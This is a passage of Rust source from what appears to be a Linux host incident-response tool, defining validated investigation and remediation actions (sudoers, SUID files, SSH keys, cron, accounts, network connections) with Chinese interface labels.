    OwnerCheck,
}

impl ShellConfigInvestigationAction {
    pub const ALL: [Self; 6] = [
        Self::ViewContext,
        Self::ViewFile,
        Self::Permissions,
        Self::History,
        Self::SuspiciousLines,
        Self::OwnerCheck,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::ViewContext => "查看上下文",
            Self::ViewFile => "查看完整文件",
            Self::Permissions => "文件权限与 ACL",
            Self::History => "文件时间线线索",
            Self::SuspiciousLines => "全部可疑配置",
            Self::OwnerCheck => "所有者检查",
        }
    }
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum SudoersInvestigationAction {
    ViewSudoers,
    ViewSource,
    SyntaxCheck,
    ListDropIns,
    UserPermissions,
    UserHistory,
    UserGroups,
    FindNoPassword,
}

impl SudoersInvestigationAction {
    pub const ALL: [Self; 8] = [
        Self::ViewSudoers,
        Self::ViewSource,
        Self::SyntaxCheck,
        Self::ListDropIns,
        Self::UserPermissions,
        Self::UserHistory,
        Self::UserGroups,
        Self::FindNoPassword,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::ViewSudoers => "查看主 sudoers",
            Self::ViewSource => "查看来源文件",
            Self::SyntaxCheck => "语法检查",
            Self::ListDropIns => "列出 sudoers.d",
            Self::UserPermissions => "用户 sudo 权限",
            Self::UserHistory => "用户 sudo 历史",
            Self::UserGroups => "用户组信息",
            Self::FindNoPassword => "查找 NOPASSWD",
        }
    }

    const fn requires_username(self) -> bool {
        matches!(
            self,
            Self::UserPermissions | Self::UserHistory | Self::UserGroups
        )
    }
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum SuidFileInvestigationAction {
    Details,
    FileType,
    Hash,
    Strings,
    Package,
    Integrity,
    Capabilities,
    Links,
}

impl SuidFileInvestigationAction {
    pub const ALL: [Self; 8] = [
        Self::Details,
        Self::FileType,
        Self::Hash,
        Self::Strings,
        Self::Package,
        Self::Integrity,
        Self::Capabilities,
        Self::Links,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::Details => "文件详情",
            Self::FileType => "文件类型",
            Self::Hash => "计算哈希",
            Self::Strings => "可疑字符串",
            Self::Package => "所属软件包",
            Self::Integrity => "软件包完整性",
            Self::Capabilities => "文件能力",
            Self::Links => "硬链接与符号链接",
        }
    }
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum SshKeyInvestigationAction {
    AuthorizedKeys,
    Fingerprint,
    Permissions,
    SshDirectory,
    KeyAge,
    AllUserKeys,
    SshdConfig,
}

impl SshKeyInvestigationAction {
    pub const ALL: [Self; 7] = [
        Self::AuthorizedKeys,
        Self::Fingerprint,
        Self::Permissions,
        Self::SshDirectory,
        Self::KeyAge,
        Self::AllUserKeys,
        Self::SshdConfig,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::AuthorizedKeys => "查看 authorized_keys",
            Self::Fingerprint => "公钥指纹",
            Self::Permissions => "密钥文件权限",
            Self::SshDirectory => "SSH 目录检查",
            Self::KeyAge => "密钥文件时间线",
            Self::AllUserKeys => "全部用户公钥",
            Self::SshdConfig => "公钥认证配置",
        }
    }
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum ArtifactInvestigationAction {
    Package(PackageInvestigationAction),
    KernelModule(KernelModuleInvestigationAction),
    Environment(EnvVarInvestigationAction),
    Startup(StartupInvestigationAction),
    Cron(CronInvestigationAction),
    Timer(TimerInvestigationAction),
    ShellConfig(ShellConfigInvestigationAction),
    Sudoers(SudoersInvestigationAction),
    SuidFile(SuidFileInvestigationAction),
    SshKey(SshKeyInvestigationAction),
}

impl ArtifactInvestigationAction {
    pub const fn label(self) -> &'static str {
        match self {
            Self::Package(action) => action.label(),
            Self::KernelModule(action) => action.label(),
            Self::Environment(action) => action.label(),
            Self::Startup(action) => action.label(),
            Self::Cron(action) => action.label(),
            Self::Timer(action) => action.label(),
            Self::ShellConfig(action) => action.label(),
            Self::Sudoers(action) => action.label(),
            Self::SuidFile(action) => action.label(),
            Self::SshKey(action) => action.label(),
        }
    }

    pub const fn tab(self) -> SystemInfoTab {
        match self {
            Self::Package(_) => SystemInfoTab::Packages,
            Self::KernelModule(_) => SystemInfoTab::KernelModules,
            Self::Environment(_) => SystemInfoTab::EnvVars,
            Self::Startup(_) => SystemInfoTab::Autostart,
            Self::Cron(_) => SystemInfoTab::Cron,
            Self::Timer(_) => SystemInfoTab::Timers,
            Self::ShellConfig(_) => SystemInfoTab::ShellConfigs,
            Self::Sudoers(_) => SystemInfoTab::Sudoers,
            Self::SuidFile(_) => SystemInfoTab::SuidFiles,
            Self::SshKey(_) => SystemInfoTab::SshKeys,
        }
    }

    const fn timeout(self) -> Duration {
        match self {
            Self::Package(PackageInvestigationAction::RemovalPreview) => Duration::from_secs(30),
            Self::KernelModule(KernelModuleInvestigationAction::Dmesg) => Duration::from_secs(20),
            Self::Cron(CronInvestigationAction::NextRun) => Duration::from_secs(20),
            Self::SuidFile(SuidFileInvestigationAction::Strings) => Duration::from_secs(20),
            _ => Duration::from_secs(15),
        }
    }
}

#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub enum ArtifactIdentity {
    Package {
        row_id: String,
        name: String,
    },
    KernelModule {
        row_id: String,
        name: String,
    },
    Environment {
        row_id: String,
        name: String,
    },
    Startup {
        row_id: String,
        unit: String,
    },
    /// A boot entry that is a script, not a systemd unit.
    ///
    /// Every startup question used to be asked through `systemctl`, so on a
    /// host that boots with sysvinit or OpenRC the tab listed its entries and
    /// offered nothing to do with any of them. The script and the file the
    /// boot directory links to are both kept: the link resolving somewhere
    /// other than the usual directory is exactly the case worth looking at.
    StartupScript {
        row_id: String,
        name: String,
        path: String,
    },
    Cron {
        row_id: String,
        username: String,
        schedule: String,
        command: String,
        source: String,
    },
    Timer {
        row_id: String,
        timer: String,
        trigger: String,
    },
    ShellConfig {
        row_id: String,
        path: String,
        line: u32,
    },
    Sudoers {
        row_id: String,
        principal: String,
        username: Option<String>,
        source: String,
    },
    SuidFile {
        row_id: String,
        path: String,
    },
    SshKey {
        row_id: String,
        username: String,
        key_type: String,
        key_content: String,
        path: String,
    },
}

impl ArtifactIdentity {
    pub fn row_id(&self) -> &str {
        match self {
            Self::Package { row_id, .. }
            | Self::KernelModule { row_id, .. }
            | Self::Environment { row_id, .. }
            | Self::Startup { row_id, .. }
            | Self::StartupScript { row_id, .. }
            | Self::Cron { row_id, .. }
            | Self::Timer { row_id, .. }
            | Self::ShellConfig { row_id, .. }
            | Self::Sudoers { row_id, .. }
            | Self::SuidFile { row_id, .. }
            | Self::SshKey { row_id, .. } => row_id,
        }
    }
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct ArtifactInvestigationRequest {
    identity: ArtifactIdentity,
    action: ArtifactInvestigationAction,
}

impl ArtifactInvestigationRequest {
    pub fn identity(&self) -> &ArtifactIdentity {
        &self.identity
    }

    pub const fn action(&self) -> ArtifactInvestigationAction {
        self.action
    }

    fn command(&self) -> CoreResult<String> {
        artifact_investigation_command(&self.identity, self.action)
    }
}

#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub struct ArtifactInvestigationResult {
    pub row_id: String,
    pub action: ArtifactInvestigationAction,
    pub output: String,
    pub truncated: bool,
}

#[derive(Debug, Clone, Copy, Eq, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum ArtifactMutationAction {
    DeleteCronFile,
    CommentShellLine,
    RemoveSuidBits,
    QuarantineSuidFile,
    AddManagedModuleBlacklist,
    RemoveManagedModuleBlacklist,
}

impl ArtifactMutationAction {
    pub const fn label(self) -> &'static str {
        match self {
            Self::DeleteCronFile => "删除独立 Cron 文件",
            Self::CommentShellLine => "注释此行",
            Self::RemoveSuidBits => "移除 SUID/SGID 位",
            Self::QuarantineSuidFile => "权限隔离（000）",
            Self::AddManagedModuleBlacklist => "阻止模块自动加载",
            Self::RemoveManagedModuleBlacklist => "移除 LovelyHawk 模块黑名单",
        }
    }

    pub const fn tab(self) -> SystemInfoTab {
        match self {
            Self::DeleteCronFile => SystemInfoTab::Cron,
            Self::CommentShellLine => SystemInfoTab::ShellConfigs,
            Self::RemoveSuidBits | Self::QuarantineSuidFile => SystemInfoTab::SuidFiles,
            Self::AddManagedModuleBlacklist | Self::RemoveManagedModuleBlacklist => {
                SystemInfoTab::KernelModules
            }
        }
    }
}

#[derive(Debug, Clone, Eq, PartialEq)]
enum ArtifactMutationIdentity {
    CronFile {
        row_id: String,
        path: RemotePath,
    },
    ShellLine {
        row_id: String,
        path: RemotePath,
        line: u32,
        displayed_content: String,
    },
    SuidFile {
        row_id: String,
        path: RemotePath,
        displayed_mode: u32,
    },
    KernelModulePolicy {
        row_id: String,
        module: String,
        path: RemotePath,
    },
}

impl ArtifactMutationIdentity {
    fn row_id(&self) -> &str {
        match self {
            Self::CronFile { row_id, .. }
            | Self::ShellLine { row_id, .. }
            | Self::SuidFile { row_id, .. }
            | Self::KernelModulePolicy { row_id, .. } => row_id,
        }
    }

    fn path(&self) -> &RemotePath {
        match self {
            Self::CronFile { path, .. }
            | Self::ShellLine { path, .. }
            | Self::SuidFile { path, .. }
            | Self::KernelModulePolicy { path, .. } => path,
        }
    }
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct ArtifactMutationRequest {
    identity: ArtifactMutationIdentity,
    action: ArtifactMutationAction,
}

impl ArtifactMutationRequest {
    pub fn row_id(&self) -> &str {
        self.identity.row_id()
    }

    pub fn path(&self) -> &RemotePath {
        self.identity.path()
    }

    pub const fn action(&self) -> ArtifactMutationAction {
        self.action
    }
}

#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub struct SuidFileSnapshot {
    pub path: RemotePath,
    pub sha256: String,
    pub mode: u32,
    pub uid: u32,
    pub gid: u32,
    pub size: u64,
    pub device: u64,
    pub inode: u64,
}

#[derive(Debug, Clone, Eq, PartialEq)]
struct SuidPermissionPlan {
    operation: OperationPlan,
    snapshot: SuidFileSnapshot,
    target_mode: u32,
    backup_directory: RemotePath,
    backup_path: RemotePath,
}

#[derive(Debug)]
enum ArtifactMutationPlanKind {
    Sftp(Box<SftpPlannedOperation>),
    Suid(Box<SuidPermissionPlan>),
}

#[derive(Debug)]
pub struct ArtifactMutationPlan {
    row_id: String,
    action: ArtifactMutationAction,
    path: RemotePath,
    kind: ArtifactMutationPlanKind,
}

impl ArtifactMutationPlan {
    pub fn definition(&self) -> &OperationPlan {
        match &self.kind {
            ArtifactMutationPlanKind::Sftp(operation) => operation.definition(),
            ArtifactMutationPlanKind::Suid(plan) => &plan.operation,
        }
    }

    pub fn row_id(&self) -> &str {
        &self.row_id
    }

    pub const fn action(&self) -> ArtifactMutationAction {
        self.action
    }

    pub fn path(&self) -> &RemotePath {
        &self.path
    }
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct ArtifactMutationOutcome {
    pub row_id: String,
    pub action: ArtifactMutationAction,
    pub path: RemotePath,
    pub verification: VerificationResult,
    pub restored_after_failed_verification: bool,
}

/// Why an account action was refused before anything ran, as the subject of
/// the refusal. Each is something the operator can understand and act on, so
/// the boundary gives each its own code instead of "does not apply".
pub const USER_ACCOUNT_ROOT_REFUSAL: &str = "user account root";
/// Deleting the account the SSH session itself logged in as.
pub const USER_ACCOUNT_SESSION_REFUSAL: &str = "user account session";
/// Locking an account that is already locked, or unlocking one that is not.
pub const USER_ACCOUNT_STATE_REFUSAL: &str = "user account state";

#[derive(Debug, Clone, Copy, Eq, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum UserAccountAction {
    Lock,
    Unlock,
    /// Removes the account record only. The home directory, mail spool and
    /// every file the account owns stay where they are: they are evidence, and
    /// removing them is a separate decision this action does not make.
    Delete,
}

impl UserAccountAction {
    pub const fn label(self) -> &'static str {
        match self {
            Self::Lock => "锁定用户账户",
            Self::Unlock => "解锁用户账户",
            Self::Delete => "删除用户账户",
        }
    }

    /// The `passwd` flag for the two actions that toggle the password lock.
    const fn passwd_flag(self) -> Option<&'static str> {
        match self {
            Self::Lock => Some("-l"),
            Self::Unlock => Some("-u"),
            Self::Delete => None,
        }
    }

    const fn metadata_key(self) -> &'static str {
        match self {
            Self::Lock => "lock",
            Self::Unlock => "unlock",
            Self::Delete => "delete",
        }
    }
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct UserAccountRequest {
    row_id: String,
    username: String,
    action: UserAccountAction,
}

impl UserAccountRequest {
    pub fn row_id(&self) -> &str {
        &self.row_id
    }

    pub fn username(&self) -> &str {
        &self.username
    }

    pub const fn action(&self) -> UserAccountAction {
        self.action
    }
}

#[derive(Debug, Clone, Copy, Eq, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum UserPasswordState {
    Locked,
    PasswordSet,
    NoPassword,
}

impl UserPasswordState {
    /// How the state reads on screen; `label` stays the stable journal word.
    const fn display(self) -> &'static str {
        match self {
            Self::Locked => "已锁定",
            Self::PasswordSet => "已设置口令",
            Self::NoPassword => "没有口令",
        }
    }

    const fn label(self) -> &'static str {
        match self {
            Self::Locked => "locked",
            Self::PasswordSet => "password-set",
            Self::NoPassword => "no-password",
        }
    }
}

#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub struct UserAccountSnapshot {
    pub username: String,
    pub uid: u32,
    pub gid: u32,
    pub home: String,
    pub shell: String,
    pub password_state: UserPasswordState,
    pub session_username: String,
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct UserAccountPlan {
    operation: OperationPlan,
    row_id: String,
    snapshot: UserAccountSnapshot,
    action: UserAccountAction,
}

impl UserAccountPlan {
    pub fn definition(&self) -> &OperationPlan {
        &self.operation
    }

    pub fn row_id(&self) -> &str {
        &self.row_id
    }

    pub fn snapshot(&self) -> &UserAccountSnapshot {
        &self.snapshot
    }

    pub const fn action(&self) -> UserAccountAction {
        self.action
    }
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct UserAccountOutcome {
    pub username: String,
    pub action: UserAccountAction,
    pub verification: VerificationResult,
    pub restored_after_failed_verification: bool,
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum NetworkInvestigationGroup {
    IpInformation,
    PortAnalysis,
    Diagnostics,
    Security,
    Firewall,
    Logs,
}

impl NetworkInvestigationGroup {
    pub const ALL: [Self; 6] = [
        Self::IpInformation,
        Self::PortAnalysis,
        Self::Diagnostics,
        Self::Security,
        Self::Firewall,
        Self::Logs,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::IpInformation => "IP 信息",
            Self::PortAnalysis => "端口分析",
            Self::Diagnostics => "网络诊断",
            Self::Security => "安全分析",
            Self::Firewall => "防火墙",
            Self::Logs => "日志查询",
        }
    }
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum NetworkInvestigationAction {
    Whois,
    Geolocation,
    ReverseDns,
    IpType,
    PortService,
    PortProcess,
    PortConnectivity,
    Ping,
    Traceroute,
    Latency,
    TcpProbe,
    ThreatIntel,
    BlacklistCheck,
    AnomalyDetect,
    ConnectionFrequency,
    FirewallRules,
    ConnectionHistory,
    AccessLogs,
    SecurityLogs,
}

impl NetworkInvestigationAction {
    pub const ALL: [Self; 19] = [
        Self::Whois,
        Self::Geolocation,
        Self::ReverseDns,
        Self::IpType,
        Self::PortService,
        Self::PortProcess,
        Self::PortConnectivity,
        Self::Ping,
        Self::Traceroute,
        Self::Latency,
        Self::TcpProbe,
        Self::ThreatIntel,
        Self::BlacklistCheck,
        Self::AnomalyDetect,
        Self::ConnectionFrequency,
        Self::FirewallRules,
        Self::ConnectionHistory,
        Self::AccessLogs,
        Self::SecurityLogs,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::Whois => "WHOIS 查询",
            Self::Geolocation => "本地 GeoIP 查询",
            Self::ReverseDns => "反向 DNS 查询",
            Self::IpType => "IP 类型判断",
            Self::PortService => "端口服务识别",
            Self::PortProcess => "查看占用进程",
            Self::PortConnectivity => "端口连通性测试",
            Self::Ping => "Ping 测试",
            Self::Traceroute => "Traceroute 追踪",
            Self::Latency => "网络延迟测试",
            Self::TcpProbe => "TCP 连接测试",
            Self::ThreatIntel => "威胁情报准备",
            Self::BlacklistCheck => "DNS 黑名单检查",
            Self::AnomalyDetect => "异常连接检测",
            Self::ConnectionFrequency => "连接频率分析",
            Self::FirewallRules => "查看相关防火墙规则",
            Self::ConnectionHistory => "查看连接历史",
            Self::AccessLogs => "查看访问日志",
            Self::SecurityLogs => "查看安全日志",
        }
    }

    pub const fn group(self) -> NetworkInvestigationGroup {
        match self {
            Self::Whois | Self::Geolocation | Self::ReverseDns | Self::IpType => {
                NetworkInvestigationGroup::IpInformation
            }
            Self::PortService | Self::PortProcess | Self::PortConnectivity => {
                NetworkInvestigationGroup::PortAnalysis
            }
            Self::Ping | Self::Traceroute | Self::Latency | Self::TcpProbe => {
                NetworkInvestigationGroup::Diagnostics
            }
            Self::ThreatIntel
            | Self::BlacklistCheck
            | Self::AnomalyDetect
            | Self::ConnectionFrequency => NetworkInvestigationGroup::Security,
            Self::FirewallRules => NetworkInvestigationGroup::Firewall,
            Self::ConnectionHistory | Self::AccessLogs | Self::SecurityLogs => {
                NetworkInvestigationGroup::Logs
            }
        }
    }

    const fn timeout(self) -> Duration {
        match self {
            Self::Whois | Self::Traceroute | Self::Latency => Duration::from_secs(20),
            _ => Duration::from_secs(15),
        }
    }
}

#[derive(Debug, Clone, Copy, Eq, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum NetworkTransport {
    Tcp,
    Udp,
}

impl NetworkTransport {
    pub const fn label(self) -> &'static str {
        match self {
            Self::Tcp => "TCP",
            Self::Udp => "UDP",
        }
    }
}

#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub struct NetworkEndpoint {
    pub address: IpAddr,
    pub port: Option<u16>,
}

#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub struct NetworkConnectionIdentity {
    pub tab: SystemInfoTab,
    pub row_id: String,
    pub transport: NetworkTransport,
    pub local: Option<NetworkEndpoint>,
    pub remote: Option<NetworkEndpoint>,
    pub local_display: String,
    pub remote_display: String,
    pub state: String,
    pub process: String,
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct NetworkInvestigationRequest {
    identity: NetworkConnectionIdentity,
    action: NetworkInvestigationAction,
}

impl NetworkInvestigationRequest {
    pub fn identity(&self) -> &NetworkConnectionIdentity {
        &self.identity
    }

    pub const fn action(&self) -> NetworkInvestigationAction {
        self.action
    }

    fn command(&self) -> CoreResult<String> {
        network_investigation_command(&self.identity, self.action)
    }
}

#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub struct NetworkInvestigationResult {
    pub row_id: String,
    pub action: NetworkInvestigationAction,
    pub output: String,
    pub truncated: bool,
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct NetworkDisconnectRequest {
    identity: NetworkConnectionIdentity,
}

impl NetworkDisconnectRequest {
    pub fn identity(&self) -> &NetworkConnectionIdentity {
        &self.identity
    }
}

#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub struct NetworkConnectionSnapshot {
    pub local_display: String,
    pub remote_display: String,
    pub state: String,
    pub process_sha256: String,
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct NetworkDisconnectPlan {
    operation: OperationPlan,
    identity: NetworkConnectionIdentity,
    snapshot: NetworkConnectionSnapshot,
}

impl NetworkDisconnectPlan {
    pub fn definition(&self) -> &OperationPlan {
        &self.operation
    }

    pub fn identity(&self) -> &NetworkConnectionIdentity {
        &self.identity
    }

    pub fn snapshot(&self) -> &NetworkConnectionSnapshot {
        &self.snapshot
    }
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct NetworkDisconnectOutcome {
    pub row_id: String,
    pub verification: VerificationResult,
}

impl SystemInfoTable {
    fn process_row(&self, row_id: &str) -> CoreResult<(&SystemInfoRow, u32)> {
        if self.tab != SystemInfoTab::Processes {
            return Err(CoreError::validation(
                "process operation",
                "the selected row is not from the process inventory",
            ));
        }
        let row = self
            .rows
            .iter()
            .find(|row| row.id == row_id)
            .ok_or_else(|| CoreError::NotFound {
                entity: "system information row",
                id: bounded_text(row_id, 256),
            })?;
        let pid = row
            .cells
            .get(1)
            .filter(|value| is_valid_pid(value))
            .ok_or_else(|| invalid_detail_key("process PID"))?
            .parse()
            .map_err(|_| invalid_detail_key("process PID"))?;
        Ok((row, pid))
    }

    pub fn process_investigation_request(
        &self,
        row_id: &str,
        action: ProcessInvestigationAction,
    ) -> CoreResult<ProcessInvestigationRequest> {
        let (row, pid) = self.process_row(row_id)?;
        Ok(ProcessInvestigationRequest {
            row_id: row.id.clone(),
            pid,
            action,
        })
    }

    pub fn process_signal_request(
        &self,
        row_id: &str,
        signal: ProcessSignal,
    ) -> CoreResult<ProcessSignalRequest> {
        let (row, pid) = self.process_row(row_id)?;
        Ok(ProcessSignalRequest {
            row_id: row.id.clone(),
            pid,
            signal,
        })
    }

    fn service_row(&self, row_id: &str) -> CoreResult<(&SystemInfoRow, String)> {
        if self.tab != SystemInfoTab::Services {
            return Err(CoreError::validation(
                "service operation",
                "the selected row is not from the service inventory",
            ));
        }
        let row = self
            .rows
            .iter()
            .find(|row| row.id == row_id)
            .ok_or_else(|| CoreError::NotFound {
                entity: "system information row",
                id: bounded_text(row_id, 256),
            })?;
        let unit = row
            .cells
            .first()
            .filter(|unit| is_valid_unit_name(unit))
            .ok_or_else(|| invalid_detail_key("systemd unit name"))?
            .clone();
        Ok((row, unit))
    }

    fn runtime_unit_row(&self, row_id: &str) -> CoreResult<(&SystemInfoRow, String)> {
        if self.tab == SystemInfoTab::Services {
            return self.service_row(row_id);
        }
        let row = self
            .rows
            .iter()
            .find(|row| row.id == row_id)
            .ok_or_else(|| CoreError::NotFound {
                entity: "system information row",
                id: bounded_text(row_id, 256),
            })?;
        let unit = row
            .cells
            .first()
            .ok_or_else(|| invalid_detail_key("systemd unit name"))?;
        match self.tab {
            SystemInfoTab::Autostart
                if is_valid_service_unit(unit)
                    && row.cells.get(3).is_some_and(|kind| kind == "systemd") => {}
            SystemInfoTab::Timers if is_valid_timer_unit(unit) => {}
            _ => {
                return Err(CoreError::validation(
                    "service runtime",
                    "the selected row is not a supported systemd service, startup, or timer row",
                ));
            }
        }
        Ok((row, unit.clone()))
    }

    pub fn service_investigation_request(
        &self,
        row_id: &str,
        action: ServiceInvestigationAction,
    ) -> CoreResult<ServiceInvestigationRequest> {
        let (row, unit) = self.service_row(row_id)?;
        Ok(ServiceInvestigationRequest {
            row_id: row.id.clone(),
            unit,
            action,
        })
    }

    pub fn service_runtime_request(
        &self,
        row_id: &str,
        action: ServiceRuntimeAction,
    ) -> CoreResult<ServiceRuntimeRequest> {
        let (row, unit) = self.runtime_unit_row(row_id)?;
        let allowed = match self.tab {
            SystemInfoTab::Services => ServiceRuntimeAction::ALL.contains(&action),
            SystemInfoTab::Autostart => ServiceRuntimeAction::AUTOSTART.contains(&action),
            SystemInfoTab::Timers => ServiceRuntimeAction::TIMER.contains(&action),
            _ => false,
        };
        if !allowed {
            return Err(CoreError::validation(
                "service runtime",
                "the requested action is not available for this systemd inventory",
            ));
        }
        Ok(ServiceRuntimeRequest {
            row_id: row.id.clone(),
            unit,
            action,
        })
    }

    /// Which runtime change this row can take, and through which vocabulary.
    ///
    /// A startup row is a systemd unit on some hosts and a boot script on
    /// others, and the two are enabled by different programs. Deciding here,
    /// from the row the host itself produced, keeps every caller from having
    /// to ask the same question twice.
    pub fn runtime_change_request(
        &self,
        row_id: &str,
        action: ServiceRuntimeAction,
    ) -> CoreResult<RuntimeChangeRequest> {
        if self.tab == SystemInfoTab::Autostart {
            let row = self
                .rows
                .iter()
                .find(|row| row.id == row_id)
                .ok_or_else(|| CoreError::NotFound {
                    entity: "system information row",
                    id: bounded_text(row_id, 256),
                })?;
            if row.cells.get(3).is_some_and(|kind| kind == "init.d") {
                let name = row
                    .cells
                    .first()
                    .filter(|name| is_valid_init_script_name(name))
                    .ok_or_else(|| invalid_detail_key("boot script name"))?;
                // Taking one out of the boot sequence is a link change, which
                // can be read back exactly. Starting one needs a service
                // manager that is actually running to hand the job to, and
                // something afterwards that says whether it took; a boot
                // script offers neither.
                if action != ServiceRuntimeAction::Disable {
                    return Err(CoreError::validation(
                        "boot script runtime",
                        "a boot script listed here can only be taken out of the boot sequence",
                    ));
                }
                return Ok(RuntimeChangeRequest::BootScript(BootScriptRuntimeRequest {
                    row_id: row.id.clone(),
                    name: name.clone(),
                    path: validated_absolute_path(
                        row.cells
                            .get(1)
                            .map(String::as_str)
                            .ok_or_else(|| invalid_detail_key("boot script path"))?,
                    )?,
                    action,
                }));
            }
        }
        self.service_runtime_request(row_id, action)
            .map(RuntimeChangeRequest::Service)
    }

    pub fn user_identity(&self, row_id: &str) -> CoreResult<UserIdentity> {
        user_identity_from_table(self, row_id)
    }

    pub fn user_investigation_request(
        &self,
        row_id: &str,
        action: UserInvestigationAction,
    ) -> CoreResult<UserInvestigationRequest> {
        let identity = self.user_identity(row_id)?;
        Ok(UserInvestigationRequest { identity, action })
    }

    pub fn login_identity(&self, row_id: &str) -> CoreResult<LoginIdentity> {
        login_identity_from_table(self, row_id)
    }

    pub fn login_investigation_request(
        &self,
        row_id: &str,
        action: LoginInvestigationAction,
    ) -> CoreResult<LoginInvestigationRequest> {
        let identity = self.login_identity(row_id)?;
        if action.requires_source() && identity.source.is_none() {
            return Err(CoreError::validation(
                "login history investigation",
                "the selected row does not contain a validated source IP address",
            ));
        }
        Ok(LoginInvestigationRequest { identity, action })
    }

    /// Only a collected Shell configuration row can authorize opening an editor.
    /// A line number is unnecessary: empty files also have an editable file.
    pub fn shell_config_file(&self, row_id: &str) -> CoreResult<RemotePath> {
        if self.tab != SystemInfoTab::ShellConfigs {
            return Err(invalid_detail_key("shell configuration inventory"));
        }
        let path = self
            .rows
            .iter()
            .find(|row| row.id == row_id)
            .and_then(|row| row.cells.first())
            .ok_or_else(|| invalid_detail_key("shell configuration row"))?;
        RemotePath::new(validated_shell_config_path(path)?)
    }

    pub fn artifact_investigation_request(
        &self,
        row_id: &str,
        action: ArtifactInvestigationAction,
    ) -> CoreResult<ArtifactInvestigationRequest> {
        if self.tab != action.tab() {
            return Err(CoreError::validation(
                "system artifact investigation",
                "the action does not belong to the selected inventory",
            ));
        }
        let row = self
            .rows
            .iter()
            .find(|row| row.id == row_id)
            .ok_or_else(|| CoreError::NotFound {
                entity: "system information row",
                id: bounded_text(row_id, 256),
            })?;
        let cell = |index: usize, subject: &'static str| {
            row.cells
                .get(index)
                .map(String::as_str)
                .ok_or_else(|| invalid_detail_key(subject))
        };
        let name = cell(0, "system artifact identity")?;
        let identity = match action {
            ArtifactInvestigationAction::Package(_) if is_valid_package_name(name) => {
                ArtifactIdentity::Package {
                    row_id: row.id.clone(),
                    name: name.to_owned(),
                }
            }
            ArtifactInvestigationAction::KernelModule(_) if is_valid_module_name(name) => {
                ArtifactIdentity::KernelModule {
                    row_id: row.id.clone(),
                    name: name.to_owned(),
                }
            }
            ArtifactInvestigationAction::Environment(action)
                if is_valid_environment_name(name)
                    && (action != EnvVarInvestigationAction::PathDirectories || name == "PATH") =>
            {
                ArtifactIdentity::Environment {
                    row_id: row.id.clone(),
                    name: name.to_owned(),
                }
            }
            ArtifactInvestigationAction::Environment(
                EnvVarInvestigationAction::PathDirectories,
            ) => {
                return Err(CoreError::validation(
                    "environment investigation",
                    "PATH directory inspection is only valid for the PATH variable",
                ));
            }
            ArtifactInvestigationAction::Startup(startup) => {
                match cell(3, "startup type")? {
                    "systemd" if is_valid_service_unit(name) => ArtifactIdentity::Startup {
                        row_id: row.id.clone(),
                        unit: name.to_owned(),
                    },
                    "init.d" if is_valid_init_script_name(name) => {
                        if !startup.applies_to_script() {
                            return Err(CoreError::validation(
                                "startup investigation",
                                "this question is only answerable for a systemd unit",
                            ));
                        }
                        ArtifactIdentity::StartupScript {
                            row_id: row.id.clone(),
                            name: name.to_owned(),
                            // Where the boot link actually resolved. Not
                            // restricted to the usual directory: a link
                            // pointing elsewhere is the row worth opening.
                            path: validated_absolute_path(cell(1, "startup script path")?)?,
                        }
                    }
                    _ => return Err(invalid_detail_key("startup entry")),
                }
            }
            ArtifactInvestigationAction::Cron(_) => ArtifactIdentity::Cron {
                row_id: row.id.clone(),
                username: validated_username(cell(0, "cron username")?)?,
                schedule: validated_cron_schedule(cell(1, "cron schedule")?)?,
                command: validated_inert_command(cell(2, "cron command")?)?,
                source: validated_cron_source(cell(3, "cron source")?)?,
            },
            ArtifactInvestigationAction::Timer(_) if is_valid_timer_unit(name) => {
                let trigger = cell(4, "timer trigger unit")?;
                if !is_valid_unit_name(trigger) {
                    return Err(invalid_detail_key("timer trigger unit"));
                }
                ArtifactIdentity::Timer {
                    row_id: row.id.clone(),
                    timer: name.to_owned(),
                    trigger: trigger.to_owned(),
                }
            }
            ArtifactInvestigationAction::ShellConfig(_) => ArtifactIdentity::ShellConfig {
                row_id: row.id.clone(),
                path: validated_shell_config_path(name)?,
